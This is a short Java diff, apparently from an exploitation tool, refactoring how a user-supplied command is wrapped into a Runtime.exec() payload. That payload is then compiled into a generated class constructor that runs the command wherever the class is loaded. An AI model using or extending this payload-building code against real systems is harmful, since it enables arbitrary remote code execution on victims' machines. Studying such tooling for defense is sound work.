@@ -38,9 +38,7 @@ public class HTTPHelper {
         if(body.startsWith("code:")){
             body = body.substring(5);
         }else{
-            body = "java.lang.Runtime.getRuntime().exec(\"" +
-                    body.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
-                    "\");";
+            body = PayloadHelper.makeRuntimeExecPayload(body);
         }
 
         byte[] obj = ClassFiles.makeClassWithDefaultConstructor(
